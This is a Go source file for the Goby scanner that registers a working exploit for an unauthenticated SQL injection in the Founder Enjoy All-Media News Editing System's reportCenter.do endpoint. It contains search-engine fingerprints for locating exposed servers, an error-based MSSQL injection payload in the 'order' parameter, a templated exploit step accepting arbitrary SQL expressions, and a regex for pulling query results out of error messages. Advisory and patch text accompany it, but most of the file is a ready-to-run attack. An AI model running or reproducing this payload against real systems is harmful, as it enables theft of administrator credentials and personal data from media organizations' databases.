package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Founder Enjoy All-Media News Editing System /newsedit/report/reportCenter.do SQL Injection Vulnerability",
    "Description": "<p>The Founder Enjoy All-Media News Editing System is an intelligent integrated media business platform that covers multiple aspects of news production. The reportCenter.do interface of this system has a SQL injection vulnerability, allowing unauthenticated attackers to exploit this vulnerability to obtain sensitive information from the database (such as administrator backend passwords and user personal information), and possibly execute commands with high privileges to gain server system permissions.</p>",
    "Product": "Fangzheng-Media-RCP",
    "Homepage": "http://www.founder.com.cn/Business/media/Products/mtcp/show/1226.html",
    "DisclosureDate": "2024-12-19",
    "PostTime": "2024-12-26",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"/newsedit/newsedit/css/login_1.css\" || title=\"方正畅享全媒体报道指挥平台\" && body=\"方正畅享全媒体报道指挥平台\" || title=\"全媒体采编V3.0-工作平台登录\"",
    "GobyQuery": "body=\"/newsedit/newsedit/css/login_1.css\" || title=\"方正畅享全媒体报道指挥平台\" && body=\"方正畅享全媒体报道指挥平台\" || title=\"全媒体采编V3.0-工作平台登录\"",
    "Level": "2",
    "Impact": "<p>The reportCenter.do interface of this system has a SQL injection vulnerability. Unauthenticated attackers can use this vulnerability to obtain sensitive information in the database (such as administrator backend password, user personal information), and may even execute commands with high permissions to obtain server system permissions.</p>",
    "Recommendation": "<p>1. Please pay attention to the manufacturer's official website update status and install the update patch in time: <a href=\"http://www.founder.com.cn/Business/media/Products/mtcp/show/1226.html2.\">http://www.founder.com.cn/Business/media/Products/mtcp/show/1226.html2.</a> Deploy a Web application firewall to monitor database operations.3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144588739"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "DB_NAME(),@@VERSION,SYSTEM_USER",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/newsedit/report/reportCenter.do",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "type=paperLayoutList&paperDate=2023-1-1&token=1&pageNo=1&pageSize=1&order=x' THEN 5 ELSE 5 END) AS status from (select '1x' as SYS_CURRENTSTATUS) d) tmp where cast(@@version as int)=5-- a"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "将 nvarchar 值",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/newsedit/report/reportCenter.do",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "type=paperLayoutList&paperDate=2023-1-1&token=1&pageNo=1&pageSize=1&order=x' THEN 5 ELSE 5 END) AS status from (select '1x' as SYS_CURRENTSTATUS) d) tmp where cast(({{{payload}}}) as int)=5-- a"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|nvarchar 值 '([^'][\\s\\S]*?)' 转换成数据类型",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "方正畅享全媒体新闻采编系统 /newsedit/report/reportCenter.do SQL 注入漏洞",
            "Product": "方正畅享全媒体新闻采编系统",
            "Description": "<p>方正畅享全媒体新闻采编系统是一款智能化融合媒体业务平台，涵盖新闻生产的多个环节。该系统的reportCenter.do接口存在SQL注入漏洞，未经身份验证的攻击者可以通过该漏洞获取数据库中的敏感信息（如管理员后台密码、用户个人信息），甚至可能在高权限下执行命令，获取服务器系统权限。</p>",
            "Recommendation": "<p>1、请关注厂商官网更新状态，及时安装更新补丁：<a href=\"http://www.founder.com.cn/Business/media/Products/mtcp/show/1226.html\">http://www.founder.com.cn/Business/media/Products/mtcp/show/1226.html</a></p><p>2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>该系统的reportCenter.do接口存在SQL注入漏洞，未经身份验证的攻击者可以通过该漏洞获取数据库中的敏感信息（如管理员后台密码、用户个人信息），甚至可能在高权限下执行命令，获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Founder Enjoy All-Media News Editing System /newsedit/report/reportCenter.do SQL Injection Vulnerability",
            "Product": "Fangzheng-Media-RCP",
            "Description": "<p>The Founder Enjoy All-Media News Editing System is an intelligent integrated media business platform that covers multiple aspects of news production. The reportCenter.do interface of this system has a SQL injection vulnerability, allowing unauthenticated attackers to exploit this vulnerability to obtain sensitive information from the database (such as administrator backend passwords and user personal information), and possibly execute commands with high privileges to gain server system permissions.</p>",
            "Recommendation": "<p>1. Please pay attention to the manufacturer's official website update status and install the update patch in time: <a href=\"http://www.founder.com.cn/Business/media/Products/mtcp/show/1226.html2.\">http://www.founder.com.cn/Business/media/Products/mtcp/show/1226.html2.</a> Deploy a Web application firewall to monitor database operations.3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The reportCenter.do interface of this system has a SQL injection vulnerability. Unauthenticated attackers can use this vulnerability to obtain sensitive information in the database (such as administrator backend password, user personal information), and may even execute commands with high permissions to obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}"
    },
    "VariablesOrder": [
        "payload"
    ],
    "EditType": "fast",
    "PocId": "9980"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
